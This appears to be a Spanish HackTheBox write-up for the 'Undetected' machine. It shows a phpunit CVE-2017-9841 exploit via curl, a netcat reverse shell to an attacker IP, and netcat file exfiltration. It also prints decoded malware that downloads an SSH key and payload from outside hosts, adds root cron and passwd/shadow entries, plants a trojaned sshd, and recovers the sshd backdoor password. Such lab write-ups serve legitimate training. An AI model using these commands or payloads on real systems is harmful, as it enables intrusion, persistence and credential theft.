@@ -1,0 +1,381 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Undetected HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/undetected.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Undetected HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Undetected de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Undetected de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Undetected HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Undetected HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Undetected de la plataforma de HackTheBox","headline":"Writeup Undetected HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Undetected HackTheBox</h1>
+          <p>Resolución de la máquina Undetected de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.146
+Nmap scan report for 10.10.11.146
+PORT      STATE SERVICE
+22/tcp   open     ssh
+80/tcp   open     http</span>
+</code></pre></div></div>
+
+
+<div><p>Abrimos la web en el navegador y encontramos algunas pestañas, store nos redirige a "store.djewelry.htb"</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Como no hay nada interesante buscamos directorios con gobuster y encontramos "vendor"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster</span><span class="p"> dir -u store.djewelry.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
+===============================================================
+[+] Threads:                 100
+[+] Url:                     http://store.djewelry.htb
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/js                   (Status: 301) [Size: 321] [--> http://store.djewelry.htb/js/]
+/images               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/images/]
+/css                  (Status: 301) [Size: 322] [--> http://store.djewelry.htb/css/]   
+/fonts                (Status: 301) [Size: 324] [--> http://store.djewelry.htb/fonts/] 
+/vendor               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/vendor/]</span>
+</code></pre></div></div>
+
+<div><p>Si miramos lo que hay encontramos varios directorios, entre ellos "phpunit"</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Buscando vulnerabilidades llegamos a este <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-9841">articulo</a>, el cual dice que si vendor esta expuesto podemos ejecutar codigo php mediante una petición post, lo probamos y funciona</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d </span><span class="no">"&lt?php system('id');"</span><span class="p">
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</code></pre></div></div>
+
+<div><p>Como tenemos rce nos hacemos una reverse shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d </span><span class="no">"&lt?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.10 443 >/tmp/f');"</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Connection received on 10.10.11.146
+</span><span class="s2">www-data@production</span><span class="p">:</span><span class="na">~/store/vendor/phpunit/phpunit/src/Util/PHP</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ejecutamos <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linpeas</a> y vemos algunas cosas entre ellas "/var/backups/info"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">╔══════════╣</span><span class="s2"> Interesting writable files owned by me or writable by everyone (not in Home) (max 500) </span><span class="p">
+/dev/mqueue
+/dev/shm
+/dev/shm/linpeas.sh
+/run/lock
+/run/lock/apache2
+/run/screen
+/tmp
+/tmp/linpeas.sh
+/tmp/log
+/tmp/tmux-33
+/tmp/wow
+/tmp/wow/linpeas.sh
+/tmp/wow/privesc.txt
+</span><span class="kd">/var/backups/info</span><span class="p">
+/var/cache/apache2/mod_cache_disk
+/var/crash
+/var/lib/php/sessions
+/var/tmp</span>
+</code></pre></div></div>
+
+<div><p>Como es un compilado y no tiene strings lo moveremos al equipo local</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@production</span><span class="p">:</span><span class="na">~</span><span class="p">$ file /var/backups/info
+ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked,
+</span><span class="s2">www-data@production</span><span class="p">:</span><span class="na">~</span><span class="p">$ strings /var/backups/info
+Command 'strings' not found.
+</span><span class="s2">www-data@production</span><span class="p">:</span><span class="na">~</span><span class="p">$ netcat 10.10.14.10 4444 < /var/backups/info
+</span><span class="s2">www-data@production</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Lo recibimos con netcat, si le hacemos un strings entre otras cosas obtenemos una cadena</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat</span><span class="p"> -lvnp 4444 > info
+Connection received on 10.10.11.146
+</span><span class="s2">❯ strings </span><span class="p">info
+/bin/bash
+776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b
+[-] fork()
+/etc/shadow</span>
+</code></pre></div></div>
+
+<div><p>Si la decodeamos con "xxd -p -r" obtenemos otras cosas entre ellas un hash, al cual si le quitamos los \ quedaría algo así</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ echo </span><span class="no">"776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b" </span><span class="p">|</span><span class="s2"> xxd </span><span class="p">-p -r
+wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="no">$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/</span>
+</code></pre></div></div>
+
+<div><p>Si rompemos el hash con john obtenemos una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> hash
+$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/
+</span><span class="s2">❯ john</span><span class="p"> --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 XOP 2x])
+</span><span class="kd">ihatehackers</span><span class="p">     (?)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Usando el usuario steven1 y la contraseña podemos conseguir el usuario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@production</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
+steven1:x:1000:1000:,,,:/home/steven:/bin/bash
+</span><span class="s2">www-data@production</span><span class="p">:</span><span class="na">~</span><span class="p">$ su steven1
+Password: </span><span class="kd">ihatehackers</span><span class="p">
+</span><span class="s2">steven@production</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt
+e18**************************dec
+</span><span class="s2">steven@production</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si ejecutamos de nuevo linpeas encontramos "mails", asi que revisemos alguno</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">╔══════════╣</span><span class="s2"> Mails (limit 50)</span><span class="p">
+-rw-rw----   1 steven   mail       966 Jul 25  2021 /var/mail/steven
+-rw-rw----   1 steven   mail       966 Jul 25  2021 /var/spool/mail/steven</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">steven@production</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /var/spool/mail/steven
+Hi Steven.
+
+We recently updated the system but are still experiencing some strange behaviour with the Apache service.
+We have temporarily moved the web store and database to another server whilst investigations are underway.
+If for any reason you need access to the database or web application code, get in touch with Mark and he
+will generate a temporary password for you to authenticate to the temporary server.
+
+Thanks,
+sysadmin</span>
+</code></pre></div></div>
+
+<div><p>Resumiendo, ha dicho que el servicio apache se ha movido, y efectivamente lo vemos en /usr/lib/apache2</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">steven@production</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls /usr/lib/apache2
+</span><span class="na">modules
+</span><span class="s2">steven@production</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+<div><p>Si miramos lo que hay en modules vemos que hay un archivo con fecha diferente a todos los demás</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">steven@production</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -l /usr/lib/apache2/modules
+&lt...............................................................>
+-rw-r--r-- 1 root root   18560 </span><span class="na">Jan  5 14:49</span><span class="p"> mod_proxy_wstunnel.so
+-rw-r--r-- 1 root root   14544 </span><span class="na">Jan  5 14:49</span><span class="p"> mod_ratelimit.so
+-rw-r--r-- 1 root root   34800 </span><span class="kd">May 17  2021</span><span class="p"> mod_reader.so
+-rw-r--r-- 1 root root   14544 </span><span class="na">Jan  5 14:49</span><span class="p"> mod_reflector.so
+-rw-r--r-- 1 root root   30928 </span><span class="na">Jan  5 14:49</span><span class="p"> mod_remoteip.so
+&lt...............................................................></span>
+</code></pre></div></div>
+
+<div><p>Después de pasarlo a nuestro equipo con netcat como anteriormente hicimos, al analizarlo con <a href="https://github.com/NationalSecurityAgency/ghidra">ghidra</a>, en la funcion "hook_post_config" encontramos lo siguiente</p></div>
+<div><p><img src="./3.png"><p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">int </span><span class="kd">hook_post_config</span><span class="p">(apr_pool_t </span><span class="kd">*</span><span class="no">pconf</span><span class="p">,apr_pool_t </span><span class="kd">*</span><span class="no">plog</span><span class="p">,apr_pool_t </span><span class="kd">*</span><span class="no">ptemp</span><span class="p">,server_rec </span><span class="kd">*</span><span class="no">s</span><span class="p">)
+
+{
+  </span><span class="k">long </span><span class="p">lVar1;
+  </span><span class="k">long </span><span class="p">in_FS_OFFSET;
+  </span><span class="k">char </span><span class="kd">*</span><span class="p">args [</span><span class="na">4</span><span class="p">];
+  
+  lVar1 </span><span class="kd">= *</span><span class="p">(</span><span class="k">long</span><span class="kd"> *</span><span class="p">)(in_FS_OFFSET </span><span class="kd">+</span><span class="na"> 0x28</span><span class="p">);
+  pid</span><span class="kd"> =</span><span class="p"> fork();
+  </span><span class="kd">if</span><span class="p"> (pid</span><span class="kd"> ==</span><span class="na"> 0</span><span class="p">) {
+    b64_decode(</span><span class="s2">"d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0 ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk"</span><span class="p">
+               ,(</span><span class="k">char</span><span class="kd"> *</span><span class="p">)</span><span class="na">0x0</span><span class="p">);
+    args[</span><span class="na">2</span><span class="p">] </span><span class="kd">=</span><span class="p"> (</span><span class="k">char</span><span class="kd"> *</span><span class="p">)</span><span class="na">0x0</span><span class="p">;
+    args[</span><span class="na">3</span><span class="p">] </span><span class="kd">=</span><span class="p"> (</span><span class="k">char</span><span class="kd"> *</span><span class="p">)</span><span class="na">0x0</span><span class="p">;
+    args[</span><span class="na">0</span><span class="p">] </span><span class="kd">=</span><span class="s2"> "/bin/bash"</span><span class="p">;
+    args[</span><span class="na">1</span><span class="p">] </span><span class="kd">=</span><span class="s2"> "-c"</span><span class="p">;
+    execve(</span><span class="s2">"/bin/bash"</span><span class="p">,args,(</span><span class="k">char</span><span class="kd"> **</span><span class="p">)</span><span class="na">0x0</span><span class="p">);
+  }
+  </span><span class="kd">if</span><span class="p"> (lVar1</span><span class="kd"> == *</span><span class="p">(</span><span class="k">long</span><span class="kd"> *</span><span class="p">)(in_FS_OFFSET </span><span class="kd">+ </span><span class="na">0x28</span><span class="p">)) {
+    </span><span class="kd">return</span><span class="na"> 0</span><span class="p">;
+  }
+                    </span><span class="c1">/* WARNING: Subroutine does not return */</span><span class="p">
+  __stack_chk_fail();
+}</span>
+</code></pre></div></div>
+
+<div><p>Al decodear la cadena en base64 que nos da encontramos lo siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ echo </span><span class="no">"d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk"</span><span class="p"> | </span><span class="s2">base64 </span><span class="p">-d
+wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd</span>
+</code></pre></div></div>
+
+<div><p>Nos pasamos "/usr/sbin/sshd" de la maquina a la nuestra y lo abrimos con ghidra también</p></div>
+<div><p>Al abrirlo podemos ver una función auth_password que contiene lo siguiente</p></div>
+<div><p><img src="./4.png"><p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">int </span><span class="kd">auth_password</span><span class="p">(ssh </span><span class="kd">*</span><span class="no">ssh</span><span class="p">,</span><span class="k">char</span><span class="kd"> *</span><span class="no">password</span><span class="p">)
+
+{
+  Authctxt </span><span class="kd">*</span><span class="p">ctxt;
+  passwd </span><span class="kd">*</span><span class="p">ppVar1;
+  </span><span class="k">int </span><span class="p">iVar2;
+  </span><span class="kd">uint</span><span class="p"> uVar3;
+  byte </span><span class="kd">*</span><span class="p">pbVar4;
+  byte </span><span class="kd">*</span><span class="p">pbVar5;
+  </span><span class="kd">size_t</span><span class="p"> sVar6;
+  byte bVar7;
+  </span><span class="k">int</span><span class="p"> iVar8;
+  </span><span class="k">long</span><span class="p"> in_FS_OFFSET;
+  </span><span class="k">char</span><span class="p"> backdoor [</span><span class="na">31</span><span class="p">];
+  byte local_39 [</span><span class="na">9</span><span class="p">];
+  </span><span class="k">long</span><span class="p"> local_30;
+  
+  bVar7 </span><span class="kd">=</span><span class="na"> 0xd6</span><span class="p">;
+  ctxt </span><span class="kd">= </span><span class="p">(Authctxt </span><span class="kd">*</span><span class="p">)ssh->authctxt;
+  local_30 </span><span class="kd">= *</span><span class="p">(</span><span class="k">long</span><span class="kd"> *</span><span class="p">)(in_FS_OFFSET </span><span class="kd">+ </span><span class="na">0x28</span><span class="p">);
+  backdoor._28_2_ </span><span class="kd">=</span><span class="na"> 0xa9f4</span><span class="p">;
+  ppVar1 </span><span class="kd">= </span><span class="p">ctxt->pw;
+  iVar8 </span><span class="kd">= </span><span class="p">ctxt->valid;
+  backdoor._24_4_ </span><span class="kd">=</span><span class="na"> 0xbcf0b5e3</span><span class="p">;
+  backdoor._16_8_ </span><span class="kd">=</span><span class="na"> 0xb2d6f4a0fda0b3d6</span><span class="p">;
+  backdoor[</span><span class="na">30</span><span class="p">]</span><span class="kd"> =</span><span class="na"> -0x5b</span><span class="p">;
+  backdoor._0_4_ </span><span class="kd">=</span><span class="na"> 0xf0e7abd6</span><span class="p">;
+  backdoor._4_4_ </span><span class="kd">=</span><span class="na"> 0xa4b3a3f3</span><span class="p">;
+  backdoor._8_4_ </span><span class="kd">=</span><span class="na"> 0xf7bbfdc8</span><span class="p">;
+  backdoor._12_4_ </span><span class="kd">=</span><span class="na"> 0xfdb3d6e7</span><span class="p">;
+  pbVar4 </span><span class="kd">=</span><span class="p"> (byte </span><span class="kd">*</span><span class="p">)backdoor;
+  </span><span class="kd">while</span><span class="p">(</span><span class="na"> true </span><span class="p">) {
+    pbVar5 </span><span class="kd">=</span><span class="p"> pbVar4 </span><span class="kd">+</span><span class="na"> 1</span><span class="p">;
+   </span><span class="kd"> *</span><span class="p">pbVar4</span><span class="kd"> =</span><span class="p"> bVar7</span><span class="kd"> ^</span><span class="na"> 0x96</span><span class="p">;
+    </span><span class="kd">if</span><span class="p"> (pbVar5</span><span class="kd"> ==</span><span class="p"> local_39) </span><span class="kd">break</span><span class="p">;
+    bVar7 </span><span class="kd">= *</span><span class="p">pbVar5;
+    pbVar4 </span><span class="kd">= </span><span class="p">pbVar5;
+  }
+  iVar2 </span><span class="kd">=</span><span class="k"> strcmp</span><span class="p">(password,backdoor);
+  uVar3 </span><span class="kd">=</span><span class="na"> 1</span><span class="p">;
+  </span><span class="kd">if</span><span class="p"> (iVar2 </span><span class="kd">!=</span><span class="na"> 0</span><span class="p">) {
+    sVar6 </span><span class="kd">=</span><span class="k"> strlen</span><span class="p">(password);
+    uVar3 </span><span class="kd">=</span><span class="na"> 0</span><span class="p">;
+    </span><span class="kd">if</span><span class="p"> (sVar6 </span><span class="kd"><</span><span class="na"> 0x401</span><span class="p">) {
+      </span><span class="kd">if </span><span class="p">((ppVar1->pw_uid </span><span class="kd">==</span><span class="ma"> 0</span><span class="p">) </span><span class="kd">&&</span><span class="p"> (options.permit_root_login</span><span class="kd"> !=</span><span class="na"> 3</span><span class="p">)) {
+        iVar8 </span><span class="kd">=</span><span class="na"> 0</span><span class="p">;
+      }
+      </span><span class="kd">if</span><span class="p"> ((</span><span class="kd">*</span><span class="p">password </span><span class="kd">!=</span><span class="s2"> '</span><span class="na">\0</span><span class="s2">'</span><span class="p">)</span><span class="kd"> ||</span><span class="p">
+         (uVar3 </span><span class="kd">=</span><span class="p"> options.permit_empty_passwd, options.permit_empty_passwd</span><span class="kd"> !=</span><span class="na"> 0</span><span class="p">)) {
+        </span><span class="kd">if </span><span class="p">(auth_password:</span><span class="kd">:</span><span class="p">expire_checked</span><span class="kd"> == </span><span class="na">0</span><span class="p">) {
+          auth_password:</span><span class="kd">:</span><span class="p">expire_checked</span><span class="kd"> =</span><span class="na"> 1</span><span class="p">;
+          iVar2 </span><span class="kd">=</span><span class="p"> auth_shadow_pwexpired(ctxt);
+          </span><span class="kd">if</span><span class="p"> (iVar2</span><span class="kd"> !=</span><span class="na"> 0</span><span class="p">) {
+            ctxt->force_pwchange </span><span class="kd">=</span><span class="na"> 1</span><span class="p">;
+          }
+        }
+        iVar2 </span><span class="kd">=</span><span class="p"> sys_auth_passwd(ssh,password);
+        </span><span class="kd">if</span><span class="p"> (ctxt->force_pwchange</span><span class="kd"> !=</span><span class="na"> 0</span><span class="p">) {
+          auth_restrict_session(ssh);
+        }
+        uVar3 </span><span class="kd">= </span><span class="p">(</span><span class="no">uint</span><span class="p">)(iVar2</span><span class="kd"> !=</span><span class="na"> 0 </span><span class="kd">&&</span><span class="p"> iVar8</span><span class="kd"> !=</span><span class="na"> 0</span><span class="p">);
+      }
+    }
+  }
+  </span><span class="kd">if</span><span class="p"> (local_30</span><span class="kd"> == *</span><span class="p">(</span><span class="k">long</span><span class="kd"> *</span><span class="p">)(in_FS_OFFSET </span><span class="kd">+ </span><span class="na">0x28</span><span class="p">)) {
+    </span><span class="kd">return</span><span class="p"> uVar3;
+  }
+                    </span><span class="c1">/* WARNING: Subroutine does not return */</span><span class="p">
+  __stack_chk_fail();
+}</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver que backdoor tiene un total de 31 carácteres</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">char<span class="p"> backdoor [<span class="na">31<span class="p">];
+</code></pre></div></div></span>
+
+<div><p>Y vemos los valores que backdoor tiene</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">backdoor._24_4_ </span><span class="kd">=</span><span class="na"> 0xbcf0b5e3</span><span class="p">;
+backdoor._16_8_ </span><span class="kd">=</span><span class="na"> 0xb2d6f4a0fda0b3d6</span><span class="p">;
+backdoor[30] </span><span class="kd">=</span><span class="na"> -0x5b</span><span class="p">;
+backdoor._0_4_ </span><span class="kd">=</span><span class="na"> 0xf0e7abd6</span><span class="p">;
+backdoor._4_4_ </span><span class="kd">=</span><span class="na"> 0xa4b3a3f3</span><span class="p">;
+backdoor._8_4_ </span><span class="kd">=</span><span class="na"> 0xf7bbfdc8</span><span class="p">;
+backdoor._12_4_ </span><span class="kd">=</span><span class="na"> 0xfdb3d6e7</span><span class="p">;
+backdoor._28_2_ </span><span class="kd">=</span><span class="na"> 0xa9f4</span><span class="p">;</span>
+</code></pre></div></div>
+
+<div><p>Si los ordenamos de mayor a menor nos quedaria lo siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">30 </span><span class="kd">=</span><span class="na"> -0x5b</span><span class="p">
+28.2 </span><span class="kd">=</span><span class="na"> 0xa9f4</span><span class="p">
+24.4 </span><span class="kd">=</span><span class="na"> 0xbcf0b5e3</span><span class="p">
+16.8 </span><span class="kd">=</span><span class="na"> 0xb2d6f4a0fda0b3d6</span><span class="p">
+12.4 </span><span class="kd">=</span><span class="na"> 0xfdb3d6e7</span><span class="p">
+8.4 </span><span class="kd">=</span><span class="na"> 0xf7bbfdc8</span><span class="p">
+4.4 </span><span class="kd">=</span><span class="na"> 0xa4b3a3f3</span><span class="p">
+0.4 </span><span class="kd">=</span><span class="na"> 0xf0e7abd6</span>
+</code></pre></div></div>
+
+<div><p>Si damos clic derecho en ghidra al primer valor (30 = -0x5b) y vemos el char, vemos que el valor podemos cambiarlo por "0xa5"</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Después de todo esto obtenemos los siguientes valores</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">0xa5
+0xa9f4
+0xbcf0b5e3
+0xb2d6f4a0fda0b3d6
+0xfdb3d6e7
+0xf7bbfdc8
+0xa4b3a3f3
+0xf0e7abd6</span>
+</code></pre></div></div>
+
+<div><p>Podemos usar <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, introducimos lo que conocemos, los valores y como <a href="https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,true)From_Hex('Auto')XOR(%7B'option':'Hex','string':'0x96'%7D,'Standard',false)&input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg">output</a> obtenemos una contraseña</p></div>
+<div><p><img src="./6.png"><p></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>En este punto solo nos queda conectarnos como root por ssh</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> root@10.10.11.146
+root@10.10.11.146's password: </span><span class="kd">@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3</span><span class="p">
+</span><span class="s2">root@production</span><span class="p">:</span><span class="na">~</span><span class="p"># cat root.txt
+e01************************972
+</span><span class="s2">root@production</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
